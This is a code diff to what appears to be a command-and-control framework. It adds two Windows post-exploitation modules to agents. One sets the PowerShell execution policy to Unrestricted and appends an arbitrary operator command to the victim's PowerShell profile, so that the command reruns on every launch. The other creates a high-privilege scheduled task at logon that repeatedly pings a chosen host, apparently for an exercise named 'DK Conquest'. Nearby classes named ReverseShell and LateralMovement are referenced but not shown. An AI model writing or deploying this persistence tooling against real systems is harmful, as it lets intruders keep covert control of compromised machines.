@@ -222,6 +222,76 @@ class ScheduledTaskPersistence(BaseCommand):
 
 
 ######################################
+# 5. PS Profile Persistence
+######################################
+class PSProfilePersistence(BaseCommand):
+    """
+    Persistence via PS profiles.
+    Step 1: Allow running scripts on system
+        `Set-ExecutionPolicy Unrestricted`
+
+    Step 2: Get profile, if not exist, create profile
+        if (!(Test-Path -Path $PROFILE)) {
+            New-Item -ItemType File -Path $PROFILE -Force
+        }
+
+    Step 3: Append to profile
+
+
+    """
+
+    command_name = "ps_profile_persistence"
+    command_help = (
+        "\tUsage: `ps_profile_persistence <command_to_run>`\n"
+        "\tUses powershell profiles to establish persistence (May need admin...)\n"
+        "\tThe specified command will be run anytime the user pops powershell."
+    )
+
+    def __init__(self, command, args_list, agent_id):
+        super().__init__(command, args_list, agent_id)
+        if len(args_list) < 1:
+            raise ValueError("Usage: ps_profile_persistence <command>")
+        self.persistence_command = args_list[0]
+        self.agent_class = BaseAgent(agent_id)
+
+    def run(self):
+        try:
+            # needs to be ordered, so sync execution here
+            self.agent_class.enqueue_command("sync")
+            ## add if/else for system wide or current user
+            adjust_execution_policy = (
+                f"shell powershell Set-ExecutionPolicy Unrestricted -Scope CurrentUser"
+            )
+            self.agent_class.enqueue_command(adjust_execution_policy)
+
+            check_for_profile = "shell powershell -c 'if (!(Test-Path -Path $PROFILE)) {New-Item -ItemType File -Path $PROFILE -Force}'"
+            self.agent_class.enqueue_command(check_for_profile)
+
+            # move to writefile arg in agent
+            write_command = f"shell echo '{self.persistence_command}' >> $PROFILE"
+            self.agent_class.enqueue_command(write_command)
+
+            self.agent_class.enqueue_command("async")
+
+            # schedule_cmd = (
+            #     f'shell schtasks /create /tn "PersistentTask" /tr "{self.exe_path}" '
+            #     "/sc onlogon /rl highest"
+            # )
+            # schedule_id = self.agent_class.enqueue_command(schedule_cmd)
+            # time.sleep(1)
+            # schedule_resp = self.agent_class.get_one_command_and_response(
+            #     schedule_id
+            # ).get("response", "")
+            # if "error" in schedule_resp.lower():
+            #     raise Exception("Scheduling persistence task failed: " + schedule_resp)
+            # else:
+            #     print("Scheduled task persistence established successfully.")
+            #     self.agent_class.store_response(schedule_id, schedule_resp)
+        except Exception as e:
+            print("ScheduledTaskPersistence encountered an error:", e)
+
+
+######################################
 # 6. Reverse Shell (PowerShell)
 ######################################
 class ReverseShell(BaseCommand):
@@ -379,6 +449,63 @@ class LateralMovement(BaseCommand):
         else:
             print("Remote executable launched successfully.")
             self.agent_class.store_response(exec_id, exec_resp)
+
+
+######################################
+# 9. DK Conquest - Ping Machine
+######################################
+class ScheduledTaskPingPersistence(BaseCommand):
+    command_name = "scheduled_task_ping_persistence"
+    command_help = (
+        "\tUsage: `scheduled_task_ping_persistence <target_host>`\n"
+        "\tSchedules a task to ping a target host every 30 seconds.\n"
+        "\tThe task will run at logon with high privileges and immediately after creation."
+    )
+
+    def __init__(self, command, args_list, agent_id):
+        super().__init__(command, args_list, agent_id)
+        if len(args_list) < 1:
+            raise ValueError("Usage: scheduled_task_ping_persistence <target_host>")
+        self.target_host = args_list[0]
+        self.agent_class = BaseAgent(agent_id)
+
+    def run(self):
+        try:
+            # Create a task to ping the target every 30 seconds and also start it immediately
+            schedule_cmd = (
+                f'shell schtasks /create /tn "PingTaskEvery30Seconds" /tr "ping {self.target_host} -n 1" '
+                "/sc onlogon /rl highest /f /st 00:00 /du 9999:59:59 /sc minute /mo 1"
+            )
+            # Enqueue the command to create the task
+            schedule_id = self.agent_class.enqueue_command(schedule_cmd)
+            time.sleep(1)
+            # Get the response for the scheduled task creation
+            schedule_resp = self.agent_class.get_one_command_and_response(
+                schedule_id
+            ).get("response", "")
+
+            if "error" in schedule_resp.lower():
+                raise Exception("Scheduling ping task failed: " + schedule_resp)
+
+            # After the task is created, immediately run the task
+            run_cmd = 'shell schtasks /run /tn "PingTaskEvery30Seconds"'
+            run_id = self.agent_class.enqueue_command(run_cmd)
+            time.sleep(1)
+            run_resp = self.agent_class.get_one_command_and_response(run_id).get(
+                "response", ""
+            )
+
+            if "error" in run_resp.lower():
+                raise Exception("Running ping task immediately failed: " + run_resp)
+
+            print(
+                "Scheduled task to ping target every 30 seconds established and run immediately."
+            )
+            self.agent_class.store_response(schedule_id, schedule_resp)
+            self.agent_class.store_response(run_id, run_resp)
+
+        except Exception as e:
+            print("ScheduledTaskPingPersistence encountered an error:", e)
 
 
 ######################################
